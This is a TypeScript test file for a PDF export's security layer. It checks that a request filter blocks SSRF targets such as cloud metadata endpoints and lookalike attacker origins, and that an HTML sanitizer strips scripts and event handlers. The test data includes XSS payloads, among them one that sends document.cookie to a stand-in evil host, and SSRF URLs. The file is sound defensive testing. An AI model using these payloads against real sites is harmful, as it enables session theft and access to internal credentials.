import assert from "node:assert/strict";
import { test } from "vitest";
import type { Page } from "playwright-core";

import { hardenPdfPage, sanitizeHtmlForPdf } from "@/lib/security/pdf";

const APP_ORIGIN = "https://app.example.com";

/**
 * Captures the route handler hardenPdfPage installs, then replays requests
 * through it and reports whether each was continued or aborted.
 */
async function buildRouteProbe(allowedOrigin = APP_ORIGIN) {
  let handler: ((route: unknown) => Promise<void>) | null = null;
  const mainFrame = { name: "main" };

  const page = {
    mainFrame: () => mainFrame,
    route: async (_pattern: string, fn: (route: unknown) => Promise<void>) => {
      handler = fn;
    },
  } as unknown as Page;

  await hardenPdfPage(page, allowedOrigin);
  assert.ok(handler, "hardenPdfPage did not install a route handler");

  return async (url: string, opts: { resourceType?: string; mainFrame?: boolean } = {}) => {
    let outcome = "none";
    await handler!({
      request: () => ({
        url: () => url,
        resourceType: () => opts.resourceType ?? "document",
        frame: () => (opts.mainFrame === false ? { name: "child" } : mainFrame),
      }),
      continue: async () => { outcome = "continue"; },
      abort: async () => { outcome = "abort"; },
    });
    return outcome;
  };
}

test("an iframe to the cloud metadata endpoint is blocked", async () => {
  const probe = await buildRouteProbe();
  // The exact payload the old `isDocument` bypass let through.
  const outcome = await probe("http://169.254.169.254/latest/meta-data/", {
    resourceType: "document",
    mainFrame: false,
  });
  assert.equal(outcome, "abort");
});

test("subframe documents are blocked even on an allowed origin", async () => {
  const probe = await buildRouteProbe();
  assert.equal(
    await probe(`${APP_ORIGIN}/dashboard`, { resourceType: "document", mainFrame: false }),
    "abort",
  );
});

test("internal services are unreachable regardless of resource type", async () => {
  const probe = await buildRouteProbe();
  for (const url of [
    "http://localhost:6379/",
    "http://10.0.0.5/admin",
    "http://metadata.google.internal/computeMetadata/v1/",
  ]) {
    for (const resourceType of ["document", "image", "stylesheet", "fetch", "xhr"]) {
      assert.equal(await probe(url, { resourceType, mainFrame: false }), "abort", `${resourceType} ${url}`);
    }
  }
});

test("an origin that merely starts with the app origin is rejected", async () => {
  const probe = await buildRouteProbe();
  // startsWith() accepted every one of these.
  for (const url of [
    "https://app.example.com.evil.test/steal",
    "https://app.example.com.attacker.io/a.css",
    "https://app.example.comevil.test/",
  ]) {
    assert.equal(await probe(url, { resourceType: "stylesheet" }), "abort", url);
  }
});

test("the app's own origin and the font CDNs still load", async () => {
  const probe = await buildRouteProbe();
  assert.equal(await probe(`${APP_ORIGIN}/logo.png`, { resourceType: "image" }), "continue");
  assert.equal(
    await probe("https://fonts.googleapis.com/css2?family=Inter", { resourceType: "stylesheet" }),
    "continue",
  );
  assert.equal(await probe("https://fonts.gstatic.com/s/inter.woff2", { resourceType: "font" }), "continue");
});

test("inline schemes are allowed so setContent and data: images render", async () => {
  const probe = await buildRouteProbe();
  assert.equal(await probe("about:blank", { resourceType: "document" }), "continue");
  assert.equal(await probe("data:image/png;base64,iVBORw0KGgo=", { resourceType: "image" }), "continue");
});

test("an unparseable allowed origin grants nothing", async () => {
  const probe = await buildRouteProbe("not a url");
  assert.equal(await probe("https://anything.test/x", { resourceType: "image" }), "abort");
  // The font CDNs are independent of the app origin and still work.
  assert.equal(await probe("https://fonts.gstatic.com/x.woff2", { resourceType: "font" }), "continue");
});

test("unquoted event handlers are stripped", () => {
  // The regex sanitizer required quotes around the value, so this survived it.
  const out = sanitizeHtmlForPdf(`<img src=x onerror=fetch("http://evil.test?c="+document.cookie)>`);
  assert.ok(!/onerror/i.test(out), out);
});

test("scripts and frames are stripped in every spelling", () => {
  const payloads = [
    "<script>alert(1)</script>",
    "<SCRIPT >alert(1)</SCRIPT >",
    "<iframe src='http://169.254.169.254/'></iframe>",
    "<object data='http://10.0.0.1/'></object>",
    "<embed src='http://10.0.0.1/'>",
    `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
    `<a href="javascript:alert(1)">x</a>`,
    `<div onmouseover=alert(1)>x</div>`,
  ];

  for (const payload of payloads) {
    const out = sanitizeHtmlForPdf(payload);
    assert.ok(!/<script|<iframe|<object|<embed|javascript:|onmouseover|onerror/i.test(out),
      `survived: ${payload} -> ${out}`);
  }
});

test("the document scaffolding the export depends on is preserved", () => {
  const html = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<base href="https://app.example.com/">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">
<style>.name{font-weight:700;color:#111}</style></head>
<body><div class="header" style="margin:0 auto;-webkit-print-color-adjust:exact">Hi</div></body></html>`;

  const out = sanitizeHtmlForPdf(html);
  for (const needle of ["<base", "<style", "fonts.googleapis.com", "fonts.gstatic.com",
                        "font-weight:700", 'class="header"', "rel=\"stylesheet\""]) {
    assert.ok(out.includes(needle), `lost ${needle} from sanitized output:\n${out}`);
  }
  assert.match(out, /<html/i);
  assert.match(out, /<body/i);
});
